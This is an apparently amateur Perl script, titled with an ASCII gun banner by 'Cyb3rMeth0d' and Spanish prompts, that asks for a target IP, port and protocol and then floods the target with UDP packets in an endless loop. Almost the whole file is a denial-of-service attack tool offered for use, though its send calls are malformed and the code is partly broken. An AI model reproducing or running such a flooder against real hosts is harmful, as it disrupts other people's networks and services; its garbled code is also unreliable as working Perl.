#!/usr/bin/perl

use IO::Socket;

system("clear || cls");
#Script Banner================================================================
print q{
	
..._...|..____________________, , 
....../ `---___________----_____|] Cyb3rMeth0d
...../_==o;;;;;;;;_______.:/ 
.....), ---.(_(__) / 
....// (..) ), ----" 
...//___// 
..//___// 
.//___// 
	
 [---]   by:> Cyb3rMeth0d   [---]
 [---]   Version:> 1.5V	    [---]
};
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n Estblecer TargetIP: "; # Set Target IP
chop ($host = <stdin>);
print "===============================";
print "\n Establecer Port: "; # Set Port
chop ($port = <stdin>);
print "===============================";
print "\n Establecer Protockol (UDP) :"; # Set Protockol
chop ($proto = <stdin>);
system("clear || cls");
print "\n[*]Realizando Ataque![$host:$port] proto => [$proto].......\n\n";
sleep 3;

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n Empezando Ataque !";
	
	
}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Empezando Ataque################

}


##############################################################
#####################                #########################
#####################  Script Finlizado #########################
#####################                #########################
##############################################################
#This Script by Cyb3rMeth0d
#Gracias por Utilizar Script :)
